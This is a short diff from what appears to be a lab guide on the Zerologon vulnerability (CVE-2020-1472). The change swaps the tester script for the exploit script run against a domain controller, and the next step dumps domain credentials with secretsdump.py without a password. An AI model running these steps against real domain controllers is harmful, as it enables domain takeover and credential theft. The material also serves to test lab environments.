@@ -275,7 +275,7 @@ git clone https://github.com/dirkjanm/CVE-2020-1472.git
 mv CVE-2020-1472 exploit
 cd exploit
 chmod 755 *.py
-./zerologon_tester.py <dc-name> <dc-ip>
+./cve-2020-1472-exploit.py <dc-name> <dc-ip>
 
 cd ../zerologon-virtualenv/bin/
 secretsdump.py -no-pass -just-dc lab.corp/dc-1\$@192.168.0.20
